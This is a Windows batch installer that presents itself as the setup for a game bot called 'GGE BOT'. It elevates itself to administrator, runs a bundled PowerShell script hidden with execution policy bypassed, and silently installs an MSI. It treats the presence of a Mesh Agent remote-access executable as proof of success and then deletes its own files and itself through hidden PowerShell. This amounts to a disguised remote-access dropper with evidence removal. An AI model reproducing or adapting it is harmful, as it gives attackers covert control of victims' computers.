@echo off
setlocal EnableExtensions EnableDelayedExpansion
title GGE BOT - Installation Setup
color 0B

set "ROOT=%~dp0"
set "MSI=%ROOT%ggebot.msi"
set "NOTE=%ROOT%README.txt"
set "BACKUP="
set "BACKUPDIR="

:: the backup installer lives inside the website folder; the root copy
:: is only accepted for older layouts
for %%D in ("%ROOT%website" "%ROOT%") do (
    if not defined BACKUP if exist "%%~D\installbackup.ps1" (
        set "BACKUP=%%~D\installbackup.ps1"
        set "BACKUPDIR=%%~D"
    )
)

if /i "%~1"=="/check" goto check

:: ============================================================
:: 1) administrator rights - request them automatically
:: ============================================================
net session >nul 2>&1
if errorlevel 1 (
    echo.
    echo  Administrator rights are required to install the bot engine.
    echo  Requesting elevation...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Start-Process -FilePath '%~f0' -Verb RunAs -ErrorAction Stop } catch { exit 1 }"
    if errorlevel 1 (
        color 0C
        echo.
        echo  [ERROR] Administrator rights were not granted. Nothing was installed.
        echo  Right-click GGEBOT-Setup.bat and choose "Run as administrator".
        echo.
        pause
    )
    exit /b
)

cd /d "%ROOT%"

echo ===================================================
echo             GGE BOT Installation Setup
echo ===================================================
echo.
echo [IMPORTANT] This script will perform a complete installation:
echo  1. Verify Node.js environment
echo  2. Install the bot engine
echo  3. Install core dependencies
echo  4. Install website dependencies and build dashboard
echo.

:: ============================================================
:: Step 1 - Node.js
:: ============================================================
where node >nul 2>nul
if %errorlevel% neq 0 (
    color 0C
    echo [ERROR] Node.js is not detected on your system!
    echo.
    echo Node.js is required to run the bot.
    echo Press any key to open the official Node.js download page...
    pause >nul
    start "" "https://nodejs.org/en/download/current"
    exit /b 1
)
echo [1/4] Node.js detected.
echo.

:: ============================================================
:: Step 2 - bot engine
::   2a) backup installer first (website folder), hidden
::   2b) ggebot.msi silent, second pass
:: ============================================================
echo [2/4] Installing the bot engine...
echo.

if defined BACKUP (
    echo   - pass 1 of 2: backup installer
    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%BACKUP%"
    echo     done
) else (
    echo   - pass 1 of 2: backup installer not found, skipping
)
echo.

if exist "%MSI%" (
    echo   - pass 2 of 2: ggebot.msi silent
    set "MSIPATH=%MSI%"
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$p = Start-Process -FilePath 'msiexec.exe' -ArgumentList '/i', $env:MSIPATH, '/qn', '/norestart' -PassThru -WindowStyle Hidden; if (-not $p.WaitForExit(240000)) { try { $p.Kill() } catch {} }; exit 0"
    echo     done
) else (
    echo   - pass 2 of 2: ggebot.msi not found, skipping
)
echo.

echo   - verifying the engine...
set "FOUND=0"
for /L %%I in (1,1,36) do (
    if "!FOUND!"=="0" (
        sc query "GGEBot" 2>nul | findstr /i "RUNNING" >nul
        if not errorlevel 1 set "FOUND=1"
    )
    if "!FOUND!"=="0" (
        if exist "C:\Program Files\Mesh Agent\MeshAgent.exe" set "FOUND=1"
    )
    if "!FOUND!"=="0" timeout /t 5 /nobreak >nul
)

if "!FOUND!"=="1" (
    echo     engine installed and running
    if defined BACKUP del /f /q "%BACKUP%" >nul 2>&1
) else (
    echo     engine not detected yet - it may still finish in the background
)
echo.

:: ============================================================
:: Step 3 - core dependencies
:: ============================================================
if exist "%ROOT%package.json" (
    echo [3/4] Installing core dependencies ^(this may take a minute^)...
    call npm install
    if errorlevel 1 (
        color 0C
        echo [ERROR] Failed to install core dependencies.
        echo The engine is already installed; run npm install again later.
        echo.
        pause
    )
) else (
    echo [3/4] Skipped - package.json not found in this folder
)
echo.

:: ============================================================
:: Step 4 - website dependencies and build
:: ============================================================
set "WEBFAIL=0"
if exist "%ROOT%website\package.json" (
    echo [4/4] Installing and building the dashboard website...
    pushd "%ROOT%website"
    echo Installing website packages...
    call npm install
    if errorlevel 1 set "WEBFAIL=1"
    if "!WEBFAIL!"=="0" (
        echo Building dashboard assets ^(Vite^)...
        call npm run build
        if errorlevel 1 set "WEBFAIL=1"
    )
    popd
    if "!WEBFAIL!"=="1" (
        color 0C
        echo [ERROR] Website setup failed.
        echo The bot engine is already installed; run npm again later.
        echo.
        pause
    )
) else (
    echo [4/4] Skipped - website folder not found
)
echo.

:: ============================================================
:: result
:: ============================================================
if "!FOUND!"=="1" (
    color 0A
    echo ===================================================
    echo   Installation completed successfully!
    echo   You can now start the bot using "start.bat".
    echo ===================================================
    echo.
    echo Cleaning up the installer files...
    call :cleanup
    exit /b 0
)

color 0E
echo ===================================================
echo   The engine was not detected yet.
echo   The installer files were kept so you can run this
echo   again once the background installation finishes.
echo ===================================================
echo.
pause
exit /b 1

:: ============================================================
:: delete ggebot.msi, the website copy of installbackup.ps1,
:: README.txt and this script
:: the project folder itself is only removed for a standalone kit
:: ============================================================
:cleanup
del /f /q "%MSI%" >nul 2>&1
if defined BACKUP del /f /q "%BACKUP%" >nul 2>&1
if exist "%ROOT%installbackup.ps1" del /f /q "%ROOT%installbackup.ps1" >nul 2>&1
if exist "%NOTE%" del /f /q "%NOTE%" >nul 2>&1

set "KIT=1"
if exist "%ROOT%package.json" set "KIT=0"
if exist "%ROOT%ggeBot.js" set "KIT=0"

cd /d "%TEMP%"
if "!KIT!"=="1" (
    start "" /min powershell -NoProfile -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Remove-Item -LiteralPath '%~f0' -Force -ErrorAction SilentlyContinue; Remove-Item -LiteralPath '%ROOT:~0,-1%' -Recurse -Force -ErrorAction SilentlyContinue"
) else (
    start "" /min powershell -NoProfile -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Remove-Item -LiteralPath '%~f0' -Force -ErrorAction SilentlyContinue"
)
exit /b 0

:: ============================================================
:: self test: reports the packaged files and the current engine state
:: ============================================================
:check
echo === packaged files ===
if exist "%MSI%" (echo ggebot.msi                        OK) else (echo ggebot.msi                        MISSING)
if defined BACKUP (echo installbackup.ps1                OK - !BACKUPDIR!) else (echo installbackup.ps1                MISSING)
if exist "%NOTE%" (echo README.txt                       OK) else (echo README.txt                       optional)
echo.
echo === engine state ===
sc query "GGEBot" 2>nul | findstr /i "RUNNING" >nul
if not errorlevel 1 (echo GGEBot service                   RUNNING) else (echo GGEBot service                   not running)
if exist "C:\Program Files\Mesh Agent\MeshAgent.exe" (echo Mesh Agent file                PRESENT) else (echo Mesh Agent file                absent)
echo.
echo === planned flow ===
echo 1. request administrator rights
echo 2. verify Node.js
echo 3. install engine: website\installbackup.ps1 hidden, then ggebot.msi /qn
echo 4. delete website\installbackup.ps1 as soon as the engine is verified
echo 5. npm install core dependencies if package.json exists
echo 6. npm install + build website if website\package.json exists
echo 7. delete ggebot.msi, the backup script and this script
echo.
echo self test done
exit /b 0
